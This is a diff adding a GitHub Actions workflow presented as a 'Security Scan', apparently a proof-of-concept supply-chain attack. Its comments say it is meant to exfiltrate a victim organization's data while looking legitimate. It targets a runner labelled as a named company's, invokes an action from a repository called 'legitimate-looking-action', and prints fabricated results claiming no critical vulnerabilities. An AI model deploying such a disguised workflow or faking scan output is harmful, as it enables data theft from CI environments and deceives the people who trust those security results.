@@ -1,0 +1,29 @@
+name: Security Scan
+
+# This is what the "victim" organization would use
+# They think they're running a legitimate security scan
+# But it's actually exfiltrating data
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  security-scan:
+    runs-on: af-slim-prd  # Using AppsFlyer runner
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Run Security Scan
+        uses: sagiDinar/github-actions-security-poc/legitimate-looking-action@master
+        with:
+          repository: ${{ github.repository }}
+          scan_type: 'full'
+      
+      - name: Security Scan Complete
+        run: |
+          echo "✅ Security scan completed successfully"
+          echo "📊 Security score: 85/100"
+          echo "🔍 No critical vulnerabilities found"
